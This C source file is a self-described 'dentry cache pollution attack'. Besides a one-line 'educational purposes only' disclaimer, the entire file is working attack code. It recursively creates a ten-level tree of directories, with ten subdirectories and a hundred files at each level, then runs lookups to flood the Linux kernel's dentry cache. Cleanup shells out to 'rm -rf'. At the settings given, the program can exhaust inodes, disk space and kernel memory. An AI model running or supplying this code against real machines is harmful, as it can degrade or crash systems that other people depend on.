#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>

#define MAX_PATH_LEN 4096
#define BASE_DIR "./dentry_attack_dir"
#define SUBDIRS_PER_LEVEL 10
#define MAX_DEPTH 10
#define FILES_PER_DIR 100

// Create a deep directory structure to consume dentry cache entries
void create_directory_structure(char *path, int depth) {
    char new_path[MAX_PATH_LEN];
    
    // Create files in current directory
    for (int i = 0; i < FILES_PER_DIR; i++) {
        snprintf(new_path, MAX_PATH_LEN, "%s/file_%d", path, i);
        int fd = open(new_path, O_CREAT | O_WRONLY, 0644);
        if (fd == -1) {
            printf("Failed to create file %s: %s\n", new_path, strerror(errno));
            continue;
        }
        close(fd);
        
        // Touch the file to ensure dentry is created
        struct timespec times[2] = {{0, 0}, {0, 0}};
        clock_gettime(CLOCK_REALTIME, &times[0]);
        times[1] = times[0];
        utimensat(AT_FDCWD, new_path, times, 0);
    }
    
    // Stop recursion if we've reached max depth
    if (depth >= MAX_DEPTH) {
        return;
    }
    
    // Create subdirectories and recursively populate them
    for (int i = 0; i < SUBDIRS_PER_LEVEL; i++) {
        snprintf(new_path, MAX_PATH_LEN, "%s/dir_%d", path, i);
        
        if (mkdir(new_path, 0755) == -1) {
            if (errno != EEXIST) {
                printf("Failed to create directory %s: %s\n", new_path, strerror(errno));
                continue;
            }
        }
        
        // Recurse into the subdirectory
        create_directory_structure(new_path, depth + 1);
    }
}

// Cleanup function to remove all created directories and files
void cleanup_directories() {
    char cmd[MAX_PATH_LEN];
    printf("Cleaning up previous attack directories...\n");
    snprintf(cmd, MAX_PATH_LEN, "rm -rf %s", BASE_DIR);
    int ret = system(cmd);
    if (ret != 0) {
        printf("Warning: Cleanup command returned %d\n", ret);
    } else {
        printf("Cleanup completed successfully\n");
    }
}

// Main function to start the dentry cache attack
int main(int argc, char *argv[]) {
    int iterations = 1;
    int auto_cleanup = 1;
    
    if (argc > 1) {
        iterations = atoi(argv[1]);
    }
    
    if (argc > 2) {
        auto_cleanup = atoi(argv[2]);
    }
    
    printf("Starting dentry cache pollution attack (educational purposes only)\n");
    
    // Clean up any existing attack directories first
    cleanup_directories();
    
    printf("Creating base directory: %s\n", BASE_DIR);
    
    // Create base directory
    if (mkdir(BASE_DIR, 0755) == -1) {
        perror("Failed to create base directory");
        return EXIT_FAILURE;
    }
    
    // Record start time
    time_t start_time = time(NULL);
    
    // Run the attack for specified iterations
    for (int i = 0; i < iterations; i++) {
        printf("Iteration %d/%d - Creating directory structure...\n", i+1, iterations);
        create_directory_structure(BASE_DIR, 0);
        
        // Perform lookups to ensure dentries are cached
        printf("Performing lookups to ensure cache population...\n");
        char lookup_path[MAX_PATH_LEN];
        for (int d = 0; d < 3; d++) {
            for (int f = 0; f < 50; f++) {
                snprintf(lookup_path, MAX_PATH_LEN, "%s/dir_%d/file_%d", BASE_DIR, d, f);
                struct stat statbuf;
                stat(lookup_path, &statbuf);
            }
        }
        
        printf("Iteration %d complete.\n", i+1);
    }
    
    // Calculate and display elapsed time
    time_t end_time = time(NULL);
    printf("Attack simulation completed in %ld seconds\n", end_time - start_time);
    printf("Created a deep directory structure to consume dentry cache\n");
    
    // Auto cleanup if requested
    if (auto_cleanup) {
        printf("Auto-cleanup enabled, removing created directories...\n");
        cleanup_directories();
    } else {
        printf("Leaving attack directories in place. To clean up manually run: ./dentry_attack 0 1\n");
        printf("Or use command: rm -rf %s\n", BASE_DIR);
    }
    
    return EXIT_SUCCESS;
}
